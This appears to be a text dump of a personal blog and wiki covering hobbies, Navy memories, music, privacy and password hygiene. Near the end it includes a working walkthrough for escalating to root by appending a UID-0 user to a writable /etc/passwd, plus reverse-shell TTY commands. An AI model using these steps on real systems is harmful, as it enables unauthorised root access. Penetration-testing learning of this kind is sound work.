I've had ideas for a blog and website for a long time but never did much about it because I felt like I couldn't find the bits of technology that would comprise the site I envisioned. I wanted a blog, a wiki, a journal, and a little eye candy but none of the technologies I knew could do it. After various failed attempts with quite a few options, it occurred to me that the answer might not be a single technology, but a \"network\" of ideas (seeds) and technologies (plants) within a single domain (garden). While looking for some technical information I stumbled across Nikita Voloboev's site and then The Blue Book . I realized this is exactly what I wanted and there was a name for it! The more I poked around the more excited I got about the technology that built it. I was already well on my way with a previous website running on Jekyll and GitHub Pages but I just couldn't figure out how to get the notes aspect incorporated. I did give Gitbook a try previously, but didn't consider using them together, rather than one or the other. Yes, I know this isn't new technology, but parts of it are new to me. More about the technology below. What's a \"digital garden\" exactly? First, let's think about what an actual garden is. Generally, gardens have these qualities: It's usually a place things grow A garden is never really \"done\" Weeds can take over if left unattended (See the enormous gap in my blog posts) A garden can be very personal and private or shared with the public They require attention and love It can be a great place for reflection and contemplation There is no right or wrong way to do it This last part is the key. I am doing this for me and I can do it any way I like. Pretty clich\u00e9, but I feel like it can truly be anything I want it to be, my imagination is the only limiting factor. Do you see how this can all be applied to the digital world? Basically what I'm saying is, that this isn't a blog or wiki or website, it's all of them (or none of them?). This is a place to grow ideas and share information, as well as leaving a legacy for future generations. I'm not totally sold on GitBook, mostly because I want to be able to use footnotes (why not?) and I can't do that here. All of the other beautiful gardens I have come across were put together by folks that know what they are doing. For now, this is how we're going to roll. Not too easy on the eyes, but functional and low overhead. I guess that'll do for now. Who knew how important the technology would be? I spent quite a bit of time trying out different ways to create my garden in the way I wanted it to look. It turns out, it's like most other things in life, there is always a different way to do it. But I still struggled to make it what I envisioned. After searching for a way to make my Gitbook not look like crap, I came back to The Blue Book . Not only did I like it, there are instructions and words of encouragement on how to get it all set up! So, after a week on Gitbook, this is the new and improved look. As I'm quickly finding, this will always be a work in progress. I'm looking forward to keeping it up. I have a habit of changing hobbies often and I'm hoping this one sticks. Keep in mind this is my brain (and opinion), exposed for anyone to explore. Be gentle. Well, this is it, this is my digital garden. Who would've thought I'd be a gardener one day? 2022-08-13: I came across this article and it hit pretty close to home. There is no better reason to leave a legacy behind. This really is everything I know about everything I know. Stats? Nevermind.","title":"README"},{"location":"about/","text":"This page is a deeper dive into who my intended audience is. It's probably not very clear who this is for and that seems to vary from day to day. Sometimes I want to have a big following and get feedback, whether it's upvotes or comments, or something similar. However, I always want it to be for me. I want this garden to be my operating manual for when I am either unable to remember something or when I am awakened after some kind of reboot. 1 I have a lot to say and nowhere to say it. Facebook steals your data and does terrible things with it. I went so far as to completely delete my account from Facebook back in 2017. I\u2019m not a fan of Insta, Twitter, Snapchat, or pretty much any other social media. Reddit is my go-to for many things these days, but it\u2019s not the appropriate place for a blog and I\u2019m too lazy to have multiple accounts to keep things more anonymous there. So here we are. Just a blank slate with plenty of space and lots of things I want to say. No \u201cfriends\u201d, likes, dislikes, or funny captions. 2 I might never allow comments, and I haven't decided who I will share this site's connection with me. Maybe I'll keep it completely anonymous, but for now, it is what it is. UPDATED: 2022-06-19. I've decided for this to be live I need to start checking in updates instead of waiting for everything to be \"just right\". This is for two reasons, firstly of all, it's always going to be a work in progress and secondly I'll have a change log of all the updates I've made. It'll also make it easier to see the history of each file. I know I can do it locally, but I feel like if I'm going to commit to this whole developing in public 3 .

I suspect I'm going to have to put things in categories at some point or it will get out of hand quickly. This is a work in progress. 2022-10-30: New look and broke it up to categories, we'll call this v2.0. Don't worry, all the old questions have remained, they've just been shuffled around to where they will hopefully make sense. Life \u2691 Q03. What is the answer to life, the universe and everything? 42. 2 Q06. How long should you wait to go into the water after you've eaten? At least 30 minutes. Q09. Why is the sky blue? Sunlight reaches Earth's atmosphere and is scattered in all directions by all the gases and particles in the air. Blue light is scattered more than the other colors because it travels as shorter, smaller waves. Q10. What is the definition of a will? A dead giveaway. Q11. How much Red Bull can someone drink and not die? According to Caffiene Calculator I can drink 170 cans and still be safe. Although, I'd probably be pretty sick. Q16. If milk goes bad if not refrigerated, why does it not go bad inside the cow? It won't go bad per se, but if a cow is not milked regularly, it can eventually stop production. Me \u2691 Q01. Do you really need an FAQ page? No, but I love FAQs! Also, the introduction doesn't cover everything. Q02. Who are you? I'm a security enthusiast, sysadmin, veteran, father, husband, tinkerer, and all around geek. A jack of all trades (and master of none). Q04. Don't you have anything better to do with your time? What is a better use of my time other than giving my unwanted opinion? Q05. How often will there be a new post? When the mood strikes me. Q07. What kind of music do you like? Depends on my mood and who I'm with. Pretty much anything but country. Q08. What's wrong with country music? So many things. I've tried to like it and I've worked with people that listen to nothing but country. It's just not my thing. Q13. Cats or dogs? Cats. 3 Q17. Are you an expert on cows? No. Q18. What about cats? I like them, but not really an expert. Q30. Do you know how to pick locks? Why yes, yes I do. At least, I know the basics 7 and have some of the equipment. It's one of the hobbies I've collected. Q31. Why do you share all this information in public? Aside from my feelings and opinions, I suspect most of my personal data has already been compromised as part of a breach somewhere. As for the rest, I usually give opinions out for free, might as well have them all in one place. Site \u2691 Q00. Why does did this FAQ require you to hit refresh again to see the answers? Because I don't didn't know enough JavaScript to fix it. I already spent way too long on getting the look I had in mind, so I'm not ready to abandon it just yet. Don't worry, I'll get around to it in all my copious spare time\u2122. In the meantime, both visitors to this garden will have to refresh the page twice before the answers will be visible. This is probably the most first-world problem I can think of. If this bothers anyone you can file a ticket with our support team. 1 Update 2022-10-30: I fixed the JavaScript problem by removing it completely haha! I just used markdown a native Material extension (that I was already loading). As usual, I was making it way too complicated. I might change the green color later, but I kinda like how it looks. Q19. Why is this place called \"Cat Elevator\"? One day I was picking up my cat and the name just came to me. Seemed like a good fit. Q20. I skipped the intro , what is a digital garden? For now, you'll have to rely on the intro. I might write more about it later\u2122. Q22. Who is the intended audience of your \"garden\"? I am. I was going to add more to that sentence but then realized, it's me. Then I realized, I need an about page. Q23. Why do you double space after a period? I learned to type on a teletype machine in the Navy. A teletype message had to have two spaces after a sentence for it to be clear enough to read. Now it's just 30 years of muscle memory. Q24. Do you have a disclaimer? Why, yes I do. Q25. Where is the chat feature? This site is cobbled together in my spare time and hosted on GitHub. If you would like a chat feature, feel free to file a feature request with our support team. 5 Q26. Why don't footnote links work in the FAQ? It's a markdown/html issue. Trust me, it's easier this way, it's also more fun. 6 Q28. Why is was the nav bar not in alphabetical order? I have no idea. I am pretty rigid when it comes to things like this, and I spent a good couple hours trying to figure out why it won't put things in alphabetical order and finally gave up for now. It's definitely an mkdocs thing. I'm trying to embrace being less rigid, though and this is going to be one of those times where I am going to stop fighting it and see where it goes. Does it really need to be a meticulously trimmed garden or can it wander? For now I'm going to consider it a vine that grows in my garden and sometimes it will grow to the directions it wants. Update 2022-08-13: I figured it out, the issue is that mkdocs goes by filename and not description or title of the post. So even if my post is called \"foo\", if I name the file \"zebra.md\", it will show up at the bottom alphabetically. While I was ok with it being weird and did finally accept it, I'm happy I figured it out. I'm still going to fix it :) Update 2022-10-30: Done! Technology \u2691 Q12. Is there a map of the internet?

You look on the website for geocaches in your area and then go to the coordinates provided. 1 Once you get to a specified location, you must locate something hidden there. I really got into it after seeing it on a travel show that was hosted just down the road from me! My son was around 7 or 8 years old when we went \"treasure hunting\". We hiked and traveled around all over the world finding geocaches in places we would have never seen if it wasn't geocaching. If you are searching for a \u201ctraditional\u201d cache, it needs to be only large enough to hold a piece of paper for you to sign to prove you found it. This means it can be as small as a thimble or as large as a 5-gallon drum. Once you find it, you sign the log and return the cache exactly as you found it. In the early days of the game, you needed a handheld GPS device and access to the Geocaching website. Eventually, cell phone technology would improve and no longer be dependent on other electronic devices like a handheld GPS. This was a game-changer, especially for more urban cachers, because getting caches and waypoints onto a handheld GPS was painful at best. I would get a \u201cpocket query\u201d which provides a filtered list of the caches I was interested in finding and hit the road. Like most things in life, the best thing about it was almost always the journey. One of the requirements for placing a geocache is that you must be able to \u201cmaintain\u201d it. 2 This meant the locations were hand-picked by the person placing the cache. Even in urban settings a lot of caches were at locations of interest, such as a fountain or statue. The great thing was, that anyone could do it. Every geocache has a terrain and difficulty rating so you can choose to make it as easy or difficult as desired. The terrain was anything from wheelchair accessible to requiring \u201cspecial\u201d equipment. For example, there are caches you can only reach by diving or climbing mountains. Difficulty was based on how difficult it is to find the cache when you arrived on the scene. Sounds great, why don\u2019t you still do it? There are a few reasons I stopped. The biggest reason I stopped is that sometimes the geocache isn\u2019t at the specified location. Keep in mind this game requires other people to \u201cdo the right thing\u201c. This means replacing things as you find them or playing in a way that is fair to other players. There is no guarantee you will find what you are looking for when you get there and as I found more and more caches, I would have to travel further and further away to find new ones. While the journey can be an adventure all on it's own, it's still disappointing taking a long trip somewhere, searching for a long time, and finding out that it\u2019s there for some reason. Another reason I lost interest in geocaching was how corporate it has become. When it started, the point was to get out and have grand adventures. You didn't need anything but free access to the website. Slowly everything was being put behind the paywall. In doing some reasearch for this page I noticed you can't even view YOUR OWN logs from caches that have now been archived. I was a pretty active Geocacher starting in Mar 2005. After 2011 I started to cache less and less until my last find in 2016. I finished with 3,624 finds and a LOT of great memories.

Ingress is also similar to geocaching, where you can go solo or with other people and, it\u2019s location-based. But that is where the similarities end. Getting started is pretty easy, you need to get the app for your phone, pick a team, and off you go.

Once you have the game installed, it will show you where the portals are that are closest to you. To see portals in a specific area you have to check the map on the Niantic site.

Another interesting aspect of the game is you get points based on MU, which the amount of population within the confines of the field 4 . A large field between California and Hawaii is not worth as many points as a smaller field over a major metropolitan area. The tricky part is that links between portals may not cross, this is where teamwork comes into play. In most cases, the larger the links and amount of MU, the more people it may take to connect those links. Imagine trying to connect links across a state or even a country! To link portals together, you have to physically visit that location, and once there, find or capture 7 a portal so it is owned by your team.

I had a neighbor who was a HAM operator and he had such high-powered equipment that his broadcasting would interfere with our TV and even our (cordless) phone! Our neighbor was quite friendly, and when we got more and more annoyed with his disruptions we would go a few doors down and ask him to knock it off and he would change frequencies. One time he let me in to see his radio equipment and I was hooked from then on. HAM \u2691 I was very interested in chatting with new people, and it is probably the first hobby I ever collected. I suspect it's also the thing that got me into electronics. As an early teen, I saved up to purchase an amateur radio from Radio Shack and my neighbor even gave me an antenna. 8 to start out my journey. Eventually, I chatted with truck drivers and other amateur radio operators around the world. Computers \u2691 Around 1987, home computers were just taking off and my best friend's father brought home a PC 4 . for his job. I had never seen a computer, but as soon as I saw it in action I knew this would be my new obsession. 3 Thanks to a huge influx of cash[^4] I was able to purchase my own computer, a Commodore 128 [^4]. As I played more games and even got some exposure to programming. Luckily my friend's dad was into computers more than just for his job, so he showed us how they really worked. 7 [TODO]: Make this whole HAM/computer section it's own page. All these footnotes should have their own place. I didn't take the traditional high school, then college route. By the time I graduated high school (with a C average), I decided I didn\u2019t want to go back to school for another four years. Also, I come from a history of Navy men in my family, so it seemed almost natural that would be the next step. Before I even finished high school, I joined the Delayed Entry Program and left for boot camp about a month after I graduated high school at the age of 17. I was ready to go see the world and see what big adventures awaited me. Not only did I need my parents to co-sign for me because I wasn\u2019t 18, I almost wasn\u2019t allowed to join the Navy for two other reasons. The first time came before I even left my hometown. I joined while I was still a senior in high school and then shortly after went on my senior trip with my high school\u2026 to Russia. As it turns out, visiting a Communist country while the US government is trying to do a background check for a top secret clearance isn\u2019t wise. I had to provide a day-by-day description of where I was, who I was with, and everything I did for the entire trip and then had to break off communications with anyone I met. The second time I almost wasn\u2019t able to join, I was at MEPS , the place where you get a physical before you are allowed to join. It would seem that I inherited the flat feet of my clan because when I went to be processed I was told I had severe flat feet and it could cause knee problems later down the road. The doctor that examined me sent me to another part of the station to be further examined and get a second opinion. Nobody ever came and after a while, I decided I had waited long enough and left to join the rest of my group in the next step. So far, my back is worse than my knees, although my feet are still very flat. In the Navy \u2691 In typical recruiter fashion, I was bamboozled by my recruiter and ended up in a branch of the Navy that wasn\u2019t allowed to travel outside of my home port for more than 90 days at a time without explicit permission from TPTB (I don\u2019t remember who exactly needed to approve, probably some Admiral somewhere). Even though I joined the Navy to see the world, I really didn\u2019t leave the West Coast of the US except for a few visits to Hawaii. Coming from the East Coast, California was a big change and while I was initially disappointed about not being able to travel overseas, it turned out to work in my favor when I was getting serious with my girlfriend (who later became my wife). I had also seen other people in the Navy miss their children growing up while they were on a six-month deployment and I didn\u2019t want that to happen to me. After boot camp and A school 2 , and after specifically requesting a duty station on the East Coast, I got a bus ticket to my first duty station, the USS Bolster (ARS-38) in Long Beach, California. It had a crew of about one hundred and was a very small, tight-knit family. It definitely spoiled me because I had no idea what I was in for when my next duty station was the USS Lewis B Puller (FFG-23) . It is almost twice as long and had twice as many crew. I learned I definitely like the smaller ships, I couldn\u2019t imagine being on a HUGE ship like a carrier. I ended up serving aboard two ships and two shore commands. The end of my second enlistment was at the height of the dot com boom. I realized I could reenlist and continue to make enough to qualify for food stamps, or I could transition to a computer gig in the private sector and make about 5x that much. I was willing to reenlist a third time, but only if I was awarded a new computer school or shore duty overseas. Despite wanting to stay in, I was offered another ship in San Diego, a ship in Corpus Christi, TX or a small communications station in Guantanamo Bay, Cuba. So I chose to get out of the Navy, and the rest is history. Maybe I\u2019ll write a little more about what I remember of each duty station. I\u2019ll add it to the list of things to do. It did. \u21a9 \u201cA school\u201d is the school that teaches your specialized trade. \u21a9 Where is the line between obsession and hobby?

It would seem that I inherited the flat feet of my clan because when I went to be processed I was told I had severe flat feet and it could cause knee problems later down the road. The doctor that examined me sent me to another part of the station to be further examined and get a second opinion. Nobody ever came and after a while, I decided I had waited long enough and left to join the rest of my group in the next step. So far, my back is worse than my knees, although my feet are still very flat.","title":"Computers"},{"location":"life/In-the-navy/#in-the-navy","text":"In typical recruiter fashion, I was bamboozled by my recruiter and ended up in a branch of the Navy that wasn\u2019t allowed to travel outside of my home port for more than 90 days at a time without explicit permission from TPTB (I don\u2019t remember who exactly needed to approve, probably some Admiral somewhere). Even though I joined the Navy to see the world, I really didn\u2019t leave the West Coast of the US except for a few visits to Hawaii. Coming from the East Coast, California was a big change and while I was initially disappointed about not being able to travel overseas, it turned out to work in my favor when I was getting serious with my girlfriend (who later became my wife). I had also seen other people in the Navy miss their children growing up while they were on a six-month deployment and I didn\u2019t want that to happen to me. After boot camp and A school 2 , and after specifically requesting a duty station on the East Coast, I got a bus ticket to my first duty station, the USS Bolster (ARS-38) in Long Beach, California. It had a crew of about one hundred and was a very small, tight-knit family. It definitely spoiled me because I had no idea what I was in for when my next duty station was the USS Lewis B Puller (FFG-23) . It is almost twice as long and had twice as many crew. I learned I definitely like the smaller ships, I couldn\u2019t imagine being on a HUGE ship like a carrier. I ended up serving aboard two ships and two shore commands. The end of my second enlistment was at the height of the dot com boom. I realized I could reenlist and continue to make enough to qualify for food stamps, or I could transition to a computer gig in the private sector and make about 5x that much. I was willing to reenlist a third time, but only if I was awarded a new computer school or shore duty overseas. Despite wanting to stay in, I was offered another ship in San Diego, a ship in Corpus Christi, TX or a small communications station in Guantanamo Bay, Cuba. So I chose to get out of the Navy, and the rest is history. Maybe I\u2019ll write a little more about what I remember of each duty station. I\u2019ll add it to the list of things to do. It did. \u21a9 \u201cA school\u201d is the school that teaches your specialized trade. \u21a9 Where is the line between obsession and hobby?

Especially trying to leave work at work to try and maintain that live/work balance. Lately, I've been getting into yoga and meditation. I'm good at neither yet but have been having a great time trying. I'm very blessed to have a backyard oasis to relax in, where I can contemplate the answer to life, the universe, and everything. 1 One of the things I often contemplate is, is what I'm doing \"something\"? One of my worries is feeling judged for being lazy and not doing anything. Pretty sure that comes from being in the Navy for 8 years, where you were always doing \"something\". Whether it's sleeping, working, or cleaning something, usually you were generally busy. Now that I'm older and wiser, I'm learning that it's OK to do \"nothing\". In fact, it seems to do nothing is actually doing something. People pay to travel and stay places where they can sit around on a beach, or a secluded little bungalow with a garden, or maybe a deck with a BBQ. Basically, people are paying to go somewhere and do nothing. So then doing nothing is something if you are not local? I guess it really depends on how you look at it. I've come to find that relaxing and staring out into space or closing my eyes and listening to a bubbly fountain is not only calming and centering, but it also helps me just think. Cannabis magnifies this mindset and has led to a state of euphoria that has brought me to some really interesting thoughts, ideas, and in some cases very strong memories that seem to come from the deepest recesses of my brain. What I'm saying is, it's really OK to just sit and do nothing. In fact, this is what I aspire to be; I want to be able to do nothing anytime I feel like it. I came to this conclusion while doing \"nothing\". I know it's 42. But what if Deep Thought missed something? I mean, seven and a half million years of thought isn't that long. \u21a9","title":"Is Doing Nothing Something?"},{"location":"life/tux/","text":"In memoriam \u2691 In my life, I have been lucky enough to own (or share a home with) three dogs and four cats. It's always sad to see one of them go. Recently, we had to put one of them down. She was 17 years old and lived a very happy life. She was the most cat-like cat I've ever owned. She was skittish around people, napped a lot during the day by herself in the sun, and was full of energy and playful in the evenings. Everyone who has ever owned a pet knows that even though the love may be shared around a family, the pet usually has someone who they have a special bond with. This one happened to be mine. She sat only in my lap, would listen paid attention to only me, was really only interested in hanging out with me and was really.. well.. mine. She was not very smart, though. She was the one that played with all the toys, chased all the things, jumped on top of all the things and ran around the house in circles bumping into things along the way. She always fell for the fake food sounds when we needed to get her somewhere. The other remaining cat loves to be outside and has no interest in running off, so she spends a lot of time outside in the yard with us. Unfortunately, this kitty was always a flight risk. She is easily spooked and we were always worried to let her outside at all for fear she would run off and not be able to figure out how to get back. The few times she did sneak out onto the back deck, she would end up underneath it and we'd have to coax her out. Because of this, she didn\u2019t like the backyard and so it didn\u2019t seem appropriate to commemorate her there. Most of all, she was the inspiration for the name of my garden . One evening I was working in my office towards the end of her life, and she came for my attention. I was able to lift her with one hand at this point and as I picked her up, the name just came to me.

Maybe what groups you associate with, whether it be religious, political, or otherwise. Do you have a nickname? Maybe a handle for your avatar, or just how you generally prefer people to perceive you such as \u201cI\u2019m a dad\u201d or \u201cI\u2019m a husband\u201d. That\u2019s all well and good, but what happens when your identity changes? For example, I have recently become an empty nester. This has become part of my new identity, and I\u2019m learning to adjust to that. I interact with different people now and I\u2019m not concerned about things like playdates and having to be responsible for a young person(s). Change isn\u2019t always bad and in this case, it was just.. a change. I also recently changed my handle due to circumstances beyond my control. I have used a specific nickname/handle/username for over 30 years and now, it\u2019s gone. I have code I\u2019ve written or contributed to using that name and know people in my online circles solely by that name. Being part of Gen X it\u2019s a big part of what made me, me. If someone said they had their identity \u201cstolen\u201d, one would understand what that meant. Identity theft generally happens when someone steals your personal information to commit fraud. The identity thief may use your information to apply for credit, file taxes, or get medical services. You now must get a new credit card, probably a driver\u2019s license, new bank cards, etc. But what about everywhere you have ever created a login for something? Web sites? Forums? Maybe even some code or blog postings? But I digress. Now what? I feel like I've lost a part of me, but we\u2019ve been dealing with Covid for two years now, perhaps it\u2019s time for a change.

Music-related things will go here.","title":"Music"},{"location":"music/go-go/","text":"Growing up just outside of Washington DC, I was exposed to the music that came from the area known as \"Go-Go\". Seeing shows live was an unbelievable experience and go-go was a big part of my life as a teen. Just imagine a stage (or a house party) full of nothing but percussion instruments and a few horns. No drum machines, just drums of various sizes and shapes, a few horns and a lot of interaction with the audience. Go-Go is not a spectator sport! There is a lot of call and response, a lot of cowbell, and a lot of dancing! Since I left the DC area when I was a teen, 1 some of the information here is memories, music I have, and research around the web. Wikipedia has a much different explanation of go-go and mentions a lot of bands that I'm either vaguely familiar with or just hadn't heard at all. While I agree Chuck Brown is known as \" The Godfather of Go-Go \", go-go is a musical movement that cannot be traced back to one single person. The rest of the article is odd that it mentions big concert venues and songs making an impact on the music charts when that wasn't my experience at all. When I lived in the DC area growing up there were a few big shows 2 , the best you had was going to live parties or very small venues where the only way to get a recording of the music was a live \"PA\" tape. 3 During DC's initial surge, the Department of Parks and Recreation even drove bands around in \u201cShowmobiles,\u201d allowing groups to perform free go-go concerts in multiple neighborhoods during the summer months. 4 There is really no way to accurately describe the sound of go-go music, so the best thing to do is just listen for yourself. Here are few of my favorite songs that I found on YouTube. Take Me Out to See Junkyard - The iconic \"Hee-Haw Song\" by Junkyard Band Physical Wunders 1996 - Another of my fav bands Junkyard Band - Live and direct - Gives you an idea what live shows were like in a venue ChillyWillie and High Performance Band Live is a good example of a typical show and distinct sound Northeast Groovers - (NSFW language) - One of my fav Go-Go bands A long time ago. In a land far, far away. \u21a9 For example: https://en.wikipedia.org/wiki/Go_Go_Live_at_the_Capital_Centre \u21a9 A \"PA tape\" is exactly what it sounds like. Someone would leave a cassette tape recorder beside a mic and record the music \u21a9 The local's version of the history of Go-go \u21a9","title":"Go-go Music"},{"location":"music/pink-floyd/","text":"You don't need to be high to enjoy Pink Floyd, you need Pink Floyd to enjoy being high.

Today the Senate voted to allow the FBI to look at your web browsing history without a warrant. That's right, people are protesting the government trying to keep them safe, yet this story barely hit the news. The government just got even more power to spy on your internet habits as millions of people stay quarantined at home. The US Senate voted down an amendment to the US Patriot Act that would create a tougher standard for government investigators to collect the web search and browsing histories of people in the United States. Should law-abiding people have to worry about the government looking over their shoulders the entire time you are online? That\u2019s exactly what the government has the power to do without this amendment. ISPs are already in a position to see a lot of what you do online since all of your traffic goes through their servers. This means that preventing ISP tracking online is a lot harder than just using a third-party browser add-on or browse in incognito or private mode. Your ISP can do anything they want with your data. Not only can they sell your data or use it to sell you more things, they can give it to the government without requiring a warrant. Get a VPN!

The \u201crockyou\u201d wordlist is an industry standard in the cyber security field, how can it still be relevant all these years later?! The answer is simple; People haven\u2019t changed their security hygiene. First, let\u2019s talk about what the rockyou wordlist is and why it is still in use. In December 2009, a social app company named RockYou had threat actors breach their security and steal 32 million user accounts including usernames and passwords stored in plain text. Because it\u2019s so easily attainable and comprehensive, it is still commonly used (successfully) in dictionary attacks. The full list of passwords exposed as a result of the breach is available on the Internet and is even included in Kali Linux since it\u2019s launch in 2013. At the time of writing, it is 2022. It\u2019s been 13 years since the RockYou breach, not to mention many, many more breaches since then, and what have we learned? We know nefarious people have access to a list of 32 million passwords that were actually in use back in 2009. We know they use this list of passwords to attempt to break into other user\u2019s accounts. So why are we still using those SAME PASSWORDS? Not only are people using easy to guess passwords, but companies that make devices people rely on, things like firewalls, web cams, routers, etc. STILL ship products with the same default password to consumers who are either too lazy, or don\u2019t know that they should change the default password from \u201c123456\u201d.

This shows that there is still a possibility of finding an account with an easy to guess password. If it didn\u2019t work, threat actors wouldn\u2019t try it. Why is it bad to have a weak password? \u2691 Obviously, using the same password for everything is a very dangerous thing to do. You're probably thinking, \"I don't care if someone finds my Netflix account, nobody cares what I'm watching.\" But what if Netflix was compromised? Think about the things that Netflix knows about you.. Username Password Credit Card Programming choices Email address Home/billing address Now, what could someone do with THIS data? Would any of these things be used by your other accounts like Amazon or bank account or other financial accounts? You have to think like a hacker. If your Netflix data (that is now PUBLIC) contains the name of a pet or a relative, maybe they could guess other bits of data. For example, if my compromised Netflix password is kitty89 and maybe my Amazon account password is also the same, then they would have complete control of your Amazon account including purchase history and a LOT more personal data. Well, my password isn't EXACTLY the same, I increment the number at the end! Even still it would only take a few guesses if it was kitty88 or kitty95. Worse yet, if it were kitty1995, it'd be easy to guess 1995 was a significant year. Could it be part of your other passwords or maybe even a security code or PIN for something else? See where this can go? All because someone at Netflix made a mistake. Right? Well.. In some cases, it's not directly the fault of the company that is supposed to be protecting your data, it could be a third party or contractor. Regardless of who is to blame, this day and age there are a lot more people that have access to your data than you realize. My Solution \u2691 Use a password manager I'm probably going to against some people's opinions and say your passwords or credit card numbers are far more secure in an encrypted storage that is also encrypted end to end than keeping it locally. But I think at some point, you HAVE to trust someone with your important data, especially passwords. There are alternatives, but most either require a lot of overhead, require advanced technical skills, or just aren\u2019t much more secure anyway. I currently have 378 passwords and secure notes in my password manager. There is no possible way I could remember every single one unless I just used the same one everywhere. My passwords are all randomized, and I don\u2019t even have to see them to use them! It may not be perfect, no solution really is.

Many years ago, in a previous life, I was really into computer (in)security. A friend of mine helped me with my first Slackware install and despite that I still enjoyed it. I got into going to 2600 meetings, regularly went to DEFCON and was totally hooked. This is it for me, this is what I want to be when I grow up. As time went on I found myself with a sysadmin gig where working in security seemed like it would be pretty boring. This was at a time where companies were just understanding the web wasn't a safe and trusting place. Ideas like risk management and acceptable use policies were what people worked on. Many companies didn't appreciate they would need pen testers to help protect them. Fast forward to the year 2020. People now get paid insane amounts of money for \"hacking\". There are people that look for vulnerabilities in code and/or networks and even certifications to show one has the ability to do it (or at least took a class on it). Not only can you get paid to be a hacker, but also many of those jobs let you work from anywhere on the planet. What I've found most surprising is all of the tools and the resources that are just a few keystrokes away. A family friend turned me on to the OverTheWire site that gives you challenges that call for various computer skills. From the site, you start out with a basic login for a host that contains the puzzles. Moving forward, you get the account for the next level by solving the puzzle on the current level. Each puzzle gets increasingly more difficult starting with just being able to log in and higher levels include things like setting up public/private keys for ssh finding local exploits and privilege escalation. Later, I came across Hack The Box that was even more advanced. Once you manage to get an invite (by solving a short challenge) they provide you with VPN access to their entire network that contains a number of vulnerable hosts for you to hone your pentesting skills. It's extremely organized and well designed with a leaderboard. Best of all, it's free! Both sites are completely free. I couldn't imagine having these resources when I was growing up. What a difference it would have made if I had the chance to hack into other computers with no risk of trouble from the law or anyone else! We've come a long way from hanging out on the BBS on our 2400 baud modems screaming, \"Don't pick up the phone!! I'm on the internet!\" Now get off my lawn!","title":"Back in my day"},{"location":"tech/musings/history-of-infosec-and-www/","text":"This began as a footnote of my security intro . It\u2019s interesting how the face of InfoSec has changed over the years. UNIX came around in the 1970s, at least in research facilities. From that time forward, the goal was to share information readily with anyone that had a computer and data connection to another computer. Everyone was about spreading information, transparency, and people were excited to share everything. Things were going great. There was sharing and getting anything they could get their hands on digitized! Keep in mind, the Internet is a new place and that data isn\u2019t going to get there on it\u2019s own. New content was being added to the Internet wherever possible, some intended for public consumption, some not. But this Internet thing is really starting to take off, I can put anything here and I can share with everyone! Fast forward to the 1990s. Internet access was first offered commercially, and the world clamored to get on the \u201cinformation superhighway\". This is really where we start to go off the rails. You didn\u2019t need to be at a major university or company that can afford computers the size of rooms to get on the Internet anymore. People could get online, albeit rather slowly, and start getting emails, browsing the World Wide Web, and relishing in the information age. Now everyone can get on the web. Great, right? Not exactly. As with most things in life, someone seems to come along and fuck up a good thing. The Internet was no exception, but this was going to change everything. Not only was everything shared, but it was also shared for everyone. As more and more people got online, it was a race to keep the things people really wanted private, just that.

It has some information about the subculture , the history , and even the explanation of different \"classifications\" 2 of hackers. Seems easy enough, right? Well, there is also a note on the Security hacker entry that says \"Not to be confused with Hacker or Hacker culture \". If you follow the first link you will find all of the same information spun a different way, with slightly different names. I guess everyone really does have their own definition of what a hacker is. One of my favorite tshirts has this definition of \"hack\" on the back: hack (h\u0103k) A clever, non-obvious solution to an interesting problem. An appropriate application of ingenuity to creatively overcome an obstacle or a limitation. The technical equivalent of chewing gum and duct tape. In the end, I believe a \"hacker\" is more broad of a term. As in, someone that has above average skills, usually with technology. Whether it is phones, computers, or other hardware or software. Sure, anyone can operate an iPhone. But can you jailbreak it, and customize it with your own look and feel? I would consider those skills above and beyond and therefore, a hacker.

My friend, who was also in the Navy (and later went to [Captian\u2019s Mast] https://en.wikipedia.org/wiki/Non-judicial_punishment#Mast ) for intercepting his Commanding Officer\u2019s email), got me hooked.

He often explained how security was \u201cboring\u201d and what his day-to-day work was like. That guy is a CISO somewhere now. Despite what I knew and coming from another company where I was almost solely responsible for their security, I feel like this was pivotal to my moving away from the unknown(?) InfoSec path to the more comfortable path of making a sysadmin my career, especially at a time of having a family to support. About 15 years later, my teenage son and his friends were taking high school and college-level computer science classes and they gave me the bug again. It's almost unbelievable how the wealth of information and tools had come such a LONG way in the last 15 years!

I found myself in a position where I had a low-level shell and had write access to /etc/passwd . I couldn't remember having done this before and didn't have any notes on it, so here it is. Let's assume you know the basics about what /etc/passwd does. You may not remember/know what the fields are in the passwd file. I always ask it on interview questions. As a quick refresher we'll use this line from /etc/passwd: harold:x:1001:1001:harold,,,:/home/harold:/bin/bash 1 2 3 4 5 6 7 There are 7 fields separated by a ':' Space Field Description Purpose 1 harold Username Username 2 x Password Placeholder for password 1 3 1001 UID Numeric representation of username 4 1001 GID Numeric representation of default group 5 harold,,, GECOS General info about the account 2 6 /home/harold Home dir Location of home directory 7 /bin/bash Shell Default shell Now, we have this /etc/passwd file that we can write to, but still can't set a password with the passwd command or edit the /etc/shadow file. Enter openssl. With openssl we can create an encrypted password and put it right into the passwd file. First we create the hash bash-4.2$ openssl passwd -1 -salt badguy pass123 $1$badguy$zgKg42t10j4SEDtASy6ML1 Next we append the \"new user\" into the password file along with root's UID badguy:$1$badguy$zgKg42t10j4SEDtASy6ML1:0:0:root:/root:/bin/bash Finally, we can escalate bash-4.2$ su - badguy Password: Last login: Fri Dec 6 16:10:18 EST 2019 from 192.168.1.5 on pts/0 [root@server ~]# whoami root Modern Unix/Linux operating systems keep the encrypted password in /etc/shadow. The 'x' indicates there is a password set, and is encrypted in /etc/shadow . Usually accounts with an * (asterisk) in password field don't have a password e.g: disabled for login. \u21a9 The GECOS field is typically used to record general information about the account or its user(s) such as their real name and phone number. Historically, some early Unix systems at Bell Labs used GECOS machines for print spooling and various other services, so this field was added to carry information on a user's GECOS identity. \u21a9","title":"Hacking /etc/passwd"},{"location":"tech/security/fix-tty-for-rev-shells/","text":"Fix TTY for rev shells \u2691 python3 -c \"import pty;pty.spawn('/bin/bash')\" (ctrl+Z) printf \"\\n\\n(Rows,Cols)\\n \";printf '\\e[1;91m%-6s\\e[m' $(stty size);printf \"\\n\\nTerm= \\e[91m$TERM\\e[0m\\n\\n\";stty raw -echo;fg; export SHELL=bash;export TERM=xterm-256color;stty rows 20 columns 100;\\echo ;echo ;read -p \"Enter Rows:\" ROWS;read -p \"Enter Cols:\" COLS;stty rows $ROWS columns $COLS && clear Basically a fancy version of: SHELL=/bin/bash script -q /dev/null Ctrl-Z stty raw -echo fg reset xterm","title":"Fix TTY for rev shells"},{"location":"tech/security/fix-tty-for-rev-shells/#fix-tty-for-rev-shells","text":"python3 -c 